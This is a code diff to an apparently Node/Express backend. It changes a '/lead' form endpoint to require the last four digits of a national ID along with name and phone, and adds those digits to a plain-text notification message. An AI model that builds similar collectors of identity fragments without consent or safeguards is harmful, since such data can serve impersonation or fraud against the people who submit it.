@@ -17,7 +17,6 @@ app.use(cors({
     if (!origin || origin === FRONTEND_ORIGIN) {
       return callback(null, true);
     }
-
     return callback(new Error("Origin not allowed"));
   },
   methods: ["GET", "POST"],
@@ -46,26 +45,31 @@ function cleanText(value, max = 80) {
 
 app.post("/lead", async (req, res) => {
   try {
+
     const name = cleanText(req.body?.name, 60);
     const phone = cleanText(req.body?.phone, 30);
-    const stage = cleanText(
-      req.body?.stage || "step1_completed",
-      40
-    );
 
-    if (name.length < 3 || phone.length < 7) {
+    const nationalLast4 =
+      cleanText(req.body?.nationalLast4, 4)
+      .replace(/\D/g, "");
+
+    if (
+      name.length < 3 ||
+      phone.length < 7 ||
+      !/^\d{4}$/.test(nationalLast4)
+    ) {
       return res.status(400).json({
         ok: false,
-        error: "Invalid lead data"
+        error: "Invalid participant data"
       });
     }
 
     const message = [
-      "🟣 New Demo Lead",
+      "🟣 New Demo Participant",
       "",
       `👤 Name: ${name}`,
       `📱 Phone: ${phone}`,
-      `📍 Stage: ${stage}`,
+      `🪪 ID last 4: ${nationalLast4}`,
       `🕒 Time: ${new Date().toISOString()}`
     ].join("\n");
 
@@ -95,6 +99,7 @@ app.post("/lead", async (req, res) => {
     });
 
   } catch (error) {
+
     console.error(error);
 
     return res.status(500).json({
